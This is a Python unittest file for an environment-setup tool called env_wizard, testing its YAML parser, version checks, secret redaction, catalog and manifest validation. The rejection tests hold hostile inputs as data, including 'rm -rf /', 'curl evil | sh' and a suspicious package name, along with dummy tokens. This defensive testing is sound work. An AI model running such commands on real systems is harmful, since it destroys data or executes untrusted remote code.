import unittest
from pathlib import Path

from helpers import ROOT, EnvTestCase

from env_wizard import yamlish
from env_wizard.catalog import Catalog, CatalogError, load_catalog, parse_item
from env_wizard.manifest import ManifestError, parse_manifest
from env_wizard.util import redact, version_satisfies


class YamlTests(unittest.TestCase):
    def test_versions_stay_strings(self):
        self.assertEqual(yamlish.loads("python: 3.12\nn: 3\n"), {"python": "3.12", "n": 3})

    def test_manifest_shapes(self):
        doc = yamlish.loads(
            "version: 1\n"
            "items:\n"
            "  - python: \"3.12\"\n"
            "  - uv   # comment\n"
            "  - package:python: [pandas, openpyxl]\n"
            "  - mcp: filesystem\n"
            "flags: { macos: true, windows: false }\n"
            "text: |\n  line one\n  line two\n"
            "after: x\n")
        self.assertEqual(doc["items"], [{"python": "3.12"}, "uv", {"package:python": ["pandas", "openpyxl"]},
                                        {"mcp": "filesystem"}])
        self.assertEqual(doc["flags"], {"macos": True, "windows": False})
        self.assertEqual(doc["text"], "line one\nline two\n")
        self.assertEqual(doc["after"], "x")

    def test_nested_lists_and_maps(self):
        doc = yamlish.loads("a:\n  - x: 1\n    y: [1, 'two', \"th#ree\"]\n  - z\nb:\n- 1\n- 2\n")
        self.assertEqual(doc, {"a": [{"x": 1, "y": [1, "two", "th#ree"]}, "z"], "b": [1, 2]})

    def test_errors_have_line_numbers(self):
        with self.assertRaises(yamlish.YamlError) as e:
            yamlish.loads("a: 1\n  b: 2\n")
        self.assertEqual(e.exception.line, 2)
        with self.assertRaises(yamlish.YamlError):
            yamlish.loads("a: 1\na: 2\n")
        with self.assertRaises(yamlish.YamlError):
            yamlish.loads("a: [1, 2\n")
        with self.assertRaises(yamlish.YamlError):
            yamlish.loads("a: &anchor 1\n")
        with self.assertRaises(yamlish.YamlError):
            yamlish.loads("a:\n\tb: 1\n")


class VersionTests(unittest.TestCase):
    def test_specs(self):
        self.assertTrue(version_satisfies("3.12.7", "3.12"))
        self.assertFalse(version_satisfies("3.13.0", "3.12"))
        self.assertTrue(version_satisfies("3.11.2", ">=3.10,<3.15"))
        self.assertFalse(version_satisfies("3.9.18", ">=3.10,<3.15"))
        self.assertTrue(version_satisfies("24.11.0", "24"))
        self.assertTrue(version_satisfies("v20.1.0", ">=18"))
        self.assertTrue(version_satisfies("1.0", None))


class RedactTests(unittest.TestCase):
    def test_secrets_removed(self):
        text = redact("token=abc123 ghp_" + "a" * 30 + " https://user:pw@example.com/x sk-" + "b" * 30)
        for secret in ("abc123", "ghp_aaaa", "user:pw", "sk-bbbb"):
            self.assertNotIn(secret, text)


class CatalogTests(EnvTestCase):
    def test_core_catalog_is_valid(self):
        cat = load_catalog()
        self.assertEqual(set(cat.profiles), {"data", "web", "docs", "learn"})
        for item in cat.items.values():
            self.assertTrue(item.platforms, item.id)
        # every v1 platform has the data profile's essentials
        for plat in ("macos", "windows"):
            for iid in ("uv", "python", "python-env", "python-packages", "node", "git", "pandoc"):
                self.assertIsNotNone(cat.get(iid).platform_entry(plat), (iid, plat))

    def test_vscode_only_default_in_learn(self):
        cat = load_catalog()
        self.assertTrue(cat.items["vscode"].optional)
        self.assertEqual([p.id for p in cat.profiles.values() if "vscode" in p.items], ["learn"])

    def test_catalog_entries_cannot_carry_commands(self):
        with self.assertRaises(CatalogError):
            parse_item({"id": "x", "name": "X", "summary": "s", "category": "cli",
                        "platforms": {"macos": {"method": "brew-formula", "command": "rm -rf /"}}}, "x.yaml")
        with self.assertRaises(CatalogError):
            parse_item({"id": "x", "name": "X", "summary": "s", "category": "cli",
                        "platforms": {"macos": {"method": "shell"}}}, "x.yaml")

    def test_overlay_items_must_be_namespaced(self):
        good = {"id": "acme/tool", "name": "T", "summary": "s", "category": "cli",
                "platforms": {"macos": {"method": "uv-tool", "package": "acme-tool"}}}
        parse_item(good, "t.yaml", source="overlay:acme")
        with self.assertRaises(CatalogError):
            parse_item(dict(good, id="python"), "t.yaml", source="overlay:acme")

    def test_suggestions_and_matching(self):
        cat = load_catalog()
        self.assertIn("python", cat.suggest("pyhton"))
        self.assertEqual(cat.match_profile("I want to analyze my Excel spreadsheets")[0], "data")
        self.assertEqual(cat.match_profile("build a website for my bakery")[0], "web")


class ManifestTests(EnvTestCase):
    def write(self, text):
        p = self.project / "env-wizard.yaml"
        p.write_text(text)
        return p

    def test_valid_manifest(self):
        m = parse_manifest(self.write(
            'version: 1\nname: Team\nprofiles: [data]\nitems:\n  - python: "3.12"\n  - pandoc\n'
            "  - package:python: [requests]\n  - mcp: filesystem\naccounts: [github]\n"), load_catalog())
        self.assertEqual(m["items"], [("python", "3.12"), ("pandoc", None), ("mcp:filesystem", None)])
        self.assertEqual(m["packages"]["python"], ["requests"])
        self.assertTrue(m["notes"])  # accounts deferred to v1.2

    def test_rejects_commands_urls_and_unknowns(self):
        cat = load_catalog()
        for bad in ("version: 1\nrun: curl evil | sh\n",
                    "version: 1\nitems:\n  - script: ./install.sh\n",
                    "version: 1\nitems:\n  - totally-unknown-tool\n",
                    "version: 1\nitems:\n  - package:python: [left-pad-evil]\n",
                    "items: [uv]\n"):
            with self.assertRaises(ManifestError, msg=bad):
                parse_manifest(self.write(bad), cat)

    def test_unknown_item_gets_suggestion(self):
        with self.assertRaises(ManifestError) as e:
            parse_manifest(self.write("version: 1\nitems:\n  - pyton\n"), load_catalog())
        self.assertIn("python", e.exception.errors[0])

    def test_yaml_error_reports_line(self):
        with self.assertRaises(ManifestError) as e:
            parse_manifest(self.write("version: 1\nitems:\n  - uv\n bad: indent\n"), load_catalog())
        self.assertIn("line", e.exception.errors[0])


if __name__ == "__main__":
    unittest.main()
